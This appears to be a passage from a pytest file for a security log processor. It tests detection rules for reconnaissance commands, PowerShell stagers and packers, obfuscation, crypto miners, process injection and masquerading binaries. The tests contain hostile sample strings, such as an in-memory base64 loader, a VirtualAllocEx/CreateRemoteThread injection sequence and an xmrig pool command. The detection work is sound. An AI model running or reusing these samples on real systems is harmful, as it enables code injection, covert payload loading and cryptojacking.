    if re.search(r'\bipconfig\b|\bifconfig\b|\bnetstat\b|\barp\s+-a\b', param_lower):
        findings.append('RECON:NETWORK')
    if re.search(r'\bwhoami\b|\bnet\s+user\b|\bnet\s+group\b|\bnet\s+localgroup\b', param_lower):
        findings.append('RECON:USER_ENUM')
    if re.search(r'nltest\s+/dclist|dsquery|gpresult|adfind|ldapsearch', param_lower):
        findings.append('RECON:DOMAIN')
    if re.search(r'\bnet\s+share\b|\bnet\s+view\b', param_lower):
        findings.append('RECON:SHARE')
    if re.search(r'\btasklist\b|wmic\s+process|get-process\b', param_lower):
        findings.append('RECON:PROCESS')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, "whoami /all")
        assert "RECON:USER_ENUM" in result

        result = processor._transform_value(code, "ipconfig /all")
        assert "RECON:NETWORK" in result

        result = processor._transform_value(code, "nltest /dclist:domain.local")
        assert "RECON:DOMAIN" in result

    def test_scriptblocktext_stager_detect(self, tmp_path, test_logger):
        """Test ScriptBlockText_StagerDetect detects PS stager patterns."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'\[system\.reflection\.assembly\]::load|\[reflection\.assembly\]::load', param_lower):
        findings.append('STAGER:REFLECTION_LOAD')
    if re.search(r'iex\s*\(.*new-object\s+net\.webclient', param_lower):
        findings.append('STAGER:STAGED_IEX')
    if re.search(r'frombase64string.*\.load\(|\.load\(.*frombase64string', param_lower):
        findings.append('STAGER:INMEMORY_NET')
    if re.search(r'appdomain\.currentdomain|definedynamicassembly', param_lower):
        findings.append('STAGER:APPDOMAIN')
    if re.search(r'\[powershell\]::create\(\)|addscript.*begininvoke|runspacefactory', param_lower):
        findings.append('STAGER:RUNSPACE')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(
            code,
            "[System.Reflection.Assembly]::Load([Convert]::FromBase64String($payload))"
        )
        assert "STAGER:REFLECTION_LOAD" in result

        result = processor._transform_value(
            code,
            "$rs = [RunspaceFactory]::CreateRunspace(); $ps = [PowerShell]::Create(); $ps.AddScript($code).BeginInvoke()"
        )
        assert "STAGER:RUNSPACE" in result

    def test_commandline_concat_deobfuscate_caret(self, tmp_path, test_logger):
        """Test CommandLine_ConcatDeobfuscate with caret escaping."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    if '^' in param:
        deobf = param.replace('^', '')
        if deobf != param:
            findings.append('DEOBF:CARET')
    concat_match = re.findall(r"'([^']+)'\s*\+\s*'([^']+)'", param)
    if concat_match:
        reconstructed = ''
        for m in concat_match:
            reconstructed += m[0] + m[1]
        if reconstructed:
            findings.append('DEOBF:CONCAT:' + reconstructed[:50])
    if re.search(r"'(\{[0-9]+\}[^']*)'?\s*-f\s*'([^']+)'", param):
        findings.append('DEOBF:FORMAT_OP')
    if '`' in param:
        deobf = re.sub(r'`([a-zA-Z])', r'\1', param)
        if deobf != param:
            findings.append('DEOBF:BACKTICK')
    if re.search(r'%[^%]+:~\d+,\d+%', param):
        findings.append('DEOBF:ENV_SUBSTR')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, "p^ow^er^sh^ell")
        assert "DEOBF:CARET" in result

        result = processor._transform_value(code, "'pow'+'ershell'")
        assert "DEOBF:CONCAT:" in result

        result = processor._transform_value(code, "pow`er`shell")
        assert "DEOBF:BACKTICK" in result

        result = processor._transform_value(code, "%COMSPEC:~0,1%%COMSPEC:~4,1%")
        assert "DEOBF:ENV_SUBSTR" in result

    def test_commandline_crypto_mining(self, tmp_path, test_logger):
        """Test CommandLine_CryptoMining detects miners."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'stratum\+tcp://|stratum\+ssl://|stratum2\+tcp://', param_lower):
        findings.append('MINING:PROTOCOL')
    pools = ['nanopool', 'f2pool', 'ethermine', 'nicehash', 'unmineable',
             'moneroocean', 'minexmr', 'hashvault']
    for pool in pools:
        if pool in param_lower:
            findings.append('MINING:POOL:' + pool)
            break
    if re.search(r'\b0x[0-9a-fA-F]{40}\b', param):
        findings.append('MINING:WALLET:ETHEREUM')
    miners = ['xmrig', 'nbminer', 't-rex', 'phoenixminer', 'ethminer', 'minerd']
    for miner in miners:
        if miner in param_lower:
            findings.append('MINING:TOOL:' + miner)
            break
    if re.search(r'--algo\s|--donate-level|--cpu-priority', param_lower):
        findings.append('MINING:MINER_ARGS')
    return '|'.join(findings[:4]) if findings else ''"""
        result = processor._transform_value(
            code,
            "xmrig --algo randomx -o stratum+tcp://pool.moneroocean.stream:10001 --donate-level 1"
        )
        assert "MINING:TOOL:xmrig" in result
        assert "MINING:PROTOCOL" in result
        assert "MINING:POOL:moneroocean" in result

        result = processor._transform_value(code, "notepad.exe")
        assert result == ""

    def test_scriptblocktext_packer_indicators(self, tmp_path, test_logger):
        """Test ScriptBlockText_PackerIndicators detects packers."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'gzipstream|io\.compression\.compressionmode', param_lower):
        findings.append('PACKER:GZIP')
    if re.search(r'deflatestream', param_lower):
        findings.append('PACKER:DEFLATE')
    has_b64 = 'frombase64string' in param_lower
    has_memstream = 'memorystream' in param_lower
    if has_b64 and has_memstream:
        findings.append('PACKER:MULTI_ENCODE')
    iex_count = len(re.findall(r'\biex\b|invoke-expression', param_lower))
    if iex_count >= 2:
        findings.append('PACKER:NESTED_IEX')
    if re.search(r'\[char\[\]\]|%\{?\s*\[char\]\s*\$_\s*\}?', param_lower):
        findings.append('PACKER:CUSTOM_ENCODING')
    if re.search(r'\[array\]::reverse|\.reverse\(\)', param_lower):
        findings.append('PACKER:REVERSAL')
    obf_vars = len(re.findall(r'\$\{[^}]{10,}\}', param))
    if obf_vars >= 2:
        findings.append('PACKER:INVOKE_OBFUSCATION')
    return '|'.join(findings[:4]) if findings else ''"""
        result = processor._transform_value(
            code,
            "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($data)); "
            "$g = New-Object IO.Compression.GZipStream($s, [IO.Compression.CompressionMode]::Decompress); "
            "IEX (New-Object IO.StreamReader($g)).ReadToEnd(); IEX $result"
        )
        assert "PACKER:GZIP" in result
        assert "PACKER:MULTI_ENCODE" in result
        assert "PACKER:NESTED_IEX" in result

    def test_commandline_injection_technique(self, tmp_path, test_logger):
        """Test CommandLine_InjectionTechnique classifies injection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'createremotethread|ntcreatethread', param_lower):
        findings.append('INJECT:CLASSIC')
    if re.search(r'virtualallocex', param_lower) and re.search(r'writeprocessmemory', param_lower):
        findings.append('INJECT:ALLOC_WRITE')
    if re.search(r'create_suspended|ntunmapviewofsection|zwunmapviewofsection', param_lower):
        findings.append('INJECT:HOLLOWING')
    if re.search(r'queueuserapc|ntqueueapcthread', param_lower):
        findings.append('INJECT:APC')
    if re.search(r'setwindowshookex', param_lower):
        findings.append('INJECT:CALLBACK')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(
            code,
            "$addr = VirtualAllocEx($hProc, 0, $sz, 0x3000, 0x40); "
            "WriteProcessMemory($hProc, $addr, $sc, $sz, [ref]0); "
            "CreateRemoteThread($hProc, 0, 0, $addr, 0, 0, [ref]0)"
        )
        assert "INJECT:CLASSIC" in result
        assert "INJECT:ALLOC_WRITE" in result

        result = processor._transform_value(
            code,
            "NtUnmapViewOfSection CREATE_SUSPENDED"
        )
        assert "INJECT:HOLLOWING" in result

    def test_image_masquerade_detect(self, tmp_path, test_logger):
        """Test Image_MasqueradeDetect catches wrong-path executables."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    path_lower = param.lower().replace('\\', '/')
    expected_paths = {
        'svchost.exe': ['/windows/system32/'],
        'csrss.exe': ['/windows/system32/'],
        'lsass.exe': ['/windows/system32/'],
        'services.exe': ['/windows/system32/'],
        'explorer.exe': ['/windows/'],
        'dllhost.exe': ['/windows/system32/', '/windows/syswow64/'],
    }
    parts = path_lower.split('/')
    exe_name = parts[-1] if parts else ''
    if exe_name in expected_paths:
        allowed = expected_paths[exe_name]
        in_allowed = False
        for allowed_path in allowed:
            if allowed_path in path_lower:
                in_allowed = True
                break
        if not in_allowed and len(path_lower) > len(exe_name):
            return 'MASQUERADE:' + exe_name
    return ''"""
        # svchost from wrong location = masquerade
        result = processor._transform_value(code, r"C:\Users\Bob\svchost.exe")
        assert "MASQUERADE:svchost.exe" in result

        # svchost from correct location = OK
        result = processor._transform_value(code, r"C:\Windows\System32\svchost.exe")
        assert result == ""

        # lsass from temp = masquerade
        result = processor._transform_value(code, r"C:\Temp\lsass.exe")
        assert "MASQUERADE:lsass.exe" in result

        # Non-critical process = not checked
        result = processor._transform_value(code, r"C:\Temp\notepad.exe")
        assert result == ""


class TestEnabledTransformsList:
    """Tests for the enabled_transforms list feature."""
    
    def test_enabled_transforms_list_controls_which_transforms_run(self, tmp_path, test_logger):
        """Test that only transforms in enabled_transforms list are executed."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            # Only enable Transform_A, not Transform_B
            "enabled_transforms": ["Transform_A"],
            "transforms": {
                "TestField": [
                    {
                        "info": "Transform A",
                        "type": "python",
                        "code": "def transform(param):\n    return 'A:' + param",
                        "alias": True,
                        "alias_name": "Transform_A",
                        "source_condition": ["json_input"],
                        "enabled": True  # This flag is ignored when enabled_transforms list exists
                    },
                    {
                        "info": "Transform B",
                        "type": "python",
                        "code": "def transform(param):\n    return 'B:' + param",
                        "alias": True,
                        "alias_name": "Transform_B",
                        "source_condition": ["json_input"],
                        "enabled": True  # This flag is ignored when enabled_transforms list exists
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1
        
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]
        
        # Transform_A should be present (in enabled list)
        assert "Transform_A" in columns
        
        # Transform_B should NOT be present (not in enabled list)
        assert "Transform_B" not in columns
        
        conn.close()
    
    def test_empty_enabled_transforms_list_disables_all(self, tmp_path, test_logger):
        """Test that empty enabled_transforms list disables all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": [],  # Empty list = no transforms
            "transforms": {
                "TestField": [{
                    "info": "Transform A",
                    "type": "python",
                    "code": "def transform(param):\n    return 'A:' + param",
                    "alias": True,
                    "alias_name": "Transform_A",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1
        
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]
        
        # No transforms should run
        assert "Transform_A" not in columns
        
        conn.close()
    
    def test_missing_enabled_transforms_disables_all(self, tmp_path, test_logger):
        """Test that missing enabled_transforms list disables all transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            # No enabled_transforms list - all transforms disabled
            "transforms": {
                "TestField": [
                    {
                        "info": "Transform A",
                        "type": "python",
                        "code": "def transform(param):\n    return 'A:' + param",
                        "alias": True,
                        "alias_name": "Transform_A",
                        "source_condition": ["json_input"]
                    }
                ]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"TestField": "value"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        assert count == 1
        
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logs")
        columns = [desc[0] for desc in cursor.description]
        
        # Without enabled_transforms list, transforms fall back to their individual
        # enabled flag (True by default), so Transform_A should run
        assert "Transform_A" in columns
        
        conn.close()


class TestStreamingProcessorTransformsEndToEnd:
    """End-to-end tests for transforms in StreamingEventProcessor."""
    
    def test_streaming_with_transforms_creates_alias_field(self, tmp_path, test_logger):
        """Test that streaming processor creates alias fields from transforms."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "enabled_transforms": ["CommandLine_Upper"],  # Enable via list
            "transforms": {
                "CommandLine": [{
                    "info": "Uppercase CommandLine",
                    "type": "python",
                    "code": "def transform(param):\n    return param.upper()",
                    "alias": True,
                    "alias_name": "CommandLine_Upper",
                    "source_condition": ["json_input"]
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        event = {"CommandLine": "powershell.exe -c whoami"}
        json_file = tmp_path / "events.json"
        json_file.write_text(json.dumps(event) + "\n")
        
        args = make_args_config("json_input")
        proc_config = ProcessingConfig(disable_progress=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            processing_config=proc_config,
            logger=test_logger
        )
        
        conn = sqlite3.connect(':memory:')
        processor.create_initial_table(conn)
        
        count = processor.process_file_streaming(conn, str(json_file), input_type='json')
        
        assert count == 1
        
        cursor = conn.cursor()
        cursor.execute("SELECT CommandLine, CommandLine_Upper FROM logs")
        row = cursor.fetchone()
        
        assert row[0] == "powershell.exe -c whoami"
        assert row[1] == "POWERSHELL.EXE -C WHOAMI"
        
        conn.close()
